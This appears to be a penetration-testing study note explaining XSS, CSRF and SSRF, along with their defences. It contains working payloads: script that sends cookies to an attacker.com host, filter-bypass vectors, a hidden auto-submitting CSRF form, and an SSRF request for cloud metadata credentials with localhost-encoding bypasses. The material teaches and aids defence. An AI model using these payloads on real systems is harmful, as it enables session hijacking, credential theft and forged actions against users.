# Cross-Site Scripting (XSS) -- Injecting Into the Browser, Not the Server

--> Unlike SQL/command injection (covered in the previous file), which targets the SERVER's interpreter, XSS injects malicious JavaScript that executes in ANOTHER USER's BROWSER -- the vulnerability lives in how an application handles untrusted input when rendering HTML, letting an attacker's script run with the full privileges (cookies, session, DOM access) of whoever views the affected page.

## Reflected XSS -- The Payload Comes From the Request Itself

--> The malicious script is part of the request (typically a URL parameter) and is immediately reflected back into the page's response without proper encoding -- requires tricking a victim into clicking a crafted link, since the payload isn't stored anywhere.

```
https://target.com/search?q=<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>

If the application echoes the "q" parameter directly into the page's HTML without encoding:
   <p>You searched for: <script>...steals the cookie...</script></p>
The script executes in the VICTIM's browser the moment they click the crafted link.
```

## Stored XSS -- The Payload Persists on the Server

--> The malicious script is saved (in a database, a comment field, a user profile bio) and served to EVERY user who later views that stored content -- generally more dangerous than reflected XSS, since it doesn't require tricking each individual victim into clicking a specific crafted link; simply viewing the affected page is enough.

```
Attacker submits a comment: <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

Every subsequent visitor who views that comment automatically has their cookie exfiltrated,
with zero action required beyond loading the page normally.
```

## DOM-Based XSS -- The Vulnerability Lives Entirely Client-Side

--> Unlike reflected/stored XSS (where the SERVER echoes untrusted input into HTML), DOM-based XSS occurs entirely within client-side JavaScript -- the vulnerable code reads untrusted data (from the URL, `document.referrer`, `localStorage`) and writes it into the DOM using an unsafe sink, without the server ever seeing the malicious payload pass through it at all.

```javascript
// Vulnerable client-side code
const params = new URLSearchParams(window.location.search);
document.getElementById("welcome").innerHTML = "Welcome, " + params.get("name");
// URL: https://target.com/page?name=<script>alert(document.cookie)</script>
```

--> `innerHTML` is the classic "unsafe sink" here -- it parses and executes any HTML/script content assigned to it, unlike `textContent`, which treats the assigned value as plain text and never executes it -- directly connecting to the safe-by-default practices covered in the HTML/DOM manipulation content in the Full Stack JavaScript notes.

## What an XSS Payload Can Actually Do

--> Session hijacking -- stealing `document.cookie` to impersonate the victim, exactly as shown above.
--> Keylogging -- attaching a hidden `keydown` event listener that exfiltrates everything the victim types on the page.
--> Full page manipulation -- rewriting the page's content entirely (e.g. a fake login form overlay) to phish credentials directly, blending into the Physical Security and Social Engineering file's phishing concepts but executed entirely within a legitimate, trusted domain's page.
--> Keyword/context-appropriate note -- `httpOnly` cookies (covered in the Node/Express Authentication file) specifically prevent JavaScript from reading a cookie via `document.cookie`, meaning a well-configured session cookie limits (but doesn't eliminate -- other attacks like full page takeover remain possible) the damage a successful XSS can do.

## Bypassing Basic Filters

--> Naive defenses (blocking the literal string `<script>`) are trivially bypassed using alternative XSS vectors that don't rely on that specific tag at all -- directly echoing the WAF Bypass and Evasion file's broader theme of pattern-matching defenses having exploitable gaps.

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">click me</a>
```

# CSRF -- Cross-Site Request Forgery

--> CSRF tricks a victim's ALREADY-AUTHENTICATED browser into unknowingly submitting a request to a target application -- unlike XSS (executing attacker script inside the target site), CSRF abuses the fact that browsers automatically attach cookies to requests, regardless of which page/site actually triggered that request.

```html
<!-- Hosted on attacker.com -- victim just needs to visit this page while logged into target.com -->
<img src="https://target.com/api/transfer?to=attacker&amount=1000" style="display:none">

<!-- Or, for a POST request -->
<form action="https://target.com/api/change-email" method="POST" id="csrf-form">
  <input type="hidden" name="newEmail" value="attacker@evil.com">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

--> If the victim is currently logged into `target.com` in the same browser, that request carries their valid session cookie automatically -- `target.com`'s server has no way to tell this request apart from one the victim genuinely intended, UNLESS the application specifically defends against it.

## CSRF Tokens -- The Standard Defense (Understood From the Attacker's Side)

--> A CSRF token is a unique, unpredictable value embedded in a legitimate form, which the server verifies matches on submission -- since `attacker.com` has no way to read/predict this token (same-origin policy prevents it from reading the target site's page content), it can't include a valid token in its forged request, and the server rejects the forgery.
--> `SameSite` cookie attribute (`Strict` or `Lax`) is a more modern, complementary defense -- it instructs the browser to NOT send a cookie at all on cross-site requests, directly neutralizing the CSRF attack vector at the browser level rather than requiring per-form token logic.
--> A penetration tester specifically checks whether state-changing endpoints (transfers, email changes, password changes) both REQUIRE a valid CSRF token AND properly reject requests missing or presenting an incorrect one -- a surprisingly common gap even in applications that "have CSRF protection" is that it's implemented inconsistently across different endpoints.

# SSRF -- Server-Side Request Forgery

--> SSRF tricks the SERVER itself into making an unintended HTTP request on the attacker's behalf, often to an internal resource the attacker couldn't otherwise reach directly from the public internet.

```
Vulnerable feature: "Enter an image URL to set as your profile picture"
   The server fetches whatever URL is provided, to download and display the image.

Attacker input instead of a real image URL:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

--> This is precisely the cloud metadata-service attack chain covered in the Cloud Penetration Testing file -- the vulnerable "fetch this URL" feature runs on a cloud instance with network access to the internal metadata service, and the attacker abuses that server-side positioning to reach a resource (`169.254.169.254`) that's completely unreachable from outside the cloud provider's internal network.

## Other Common SSRF Targets

--> Internal-only admin panels/APIs (`http://localhost:8080/admin`, `http://10.0.0.5/internal-api`) that were never intended to be reachable from outside the private network, but ARE reachable from the vulnerable server itself.
--> Cloud provider metadata endpoints (AWS, GCP, Azure all have similar internal-only metadata services, each a high-value SSRF target for credential theft).

## SSRF Defense (Understood From the Attacker's Side, to Know What Bypasses)

--> A naive defense blocklisting `169.254.169.254` and `localhost` directly can often be bypassed with alternative representations of the same address -- decimal IP notation, IPv6-mapped addresses, or a DNS name an attacker controls that resolves to the internal IP only at request time (a "DNS rebinding" attack) -- directly echoing the encoding-based evasion techniques covered in the WAF Bypass file.

```
http://0177.0.0.1/           (octal representation of 127.0.0.1)
http://2130706433/            (decimal representation of 127.0.0.1)
http://[::ffff:127.0.0.1]/     (IPv6-mapped representation)
```

# Why These Three Are Grouped Together in This File

--> XSS, CSRF, and SSRF all share a common root cause -- a system trusting a REQUEST's origin/content more than it should, whether that's a browser trusting injected script (XSS), a server trusting a request's cookie without verifying its true origin (CSRF), or a server trusting a URL it's told to fetch without verifying where that URL actually points (SSRF). Recognizing this shared pattern is what lets a tester generalize testing methodology across all three, rather than treating each as an entirely separate, unrelated category to memorize independently.
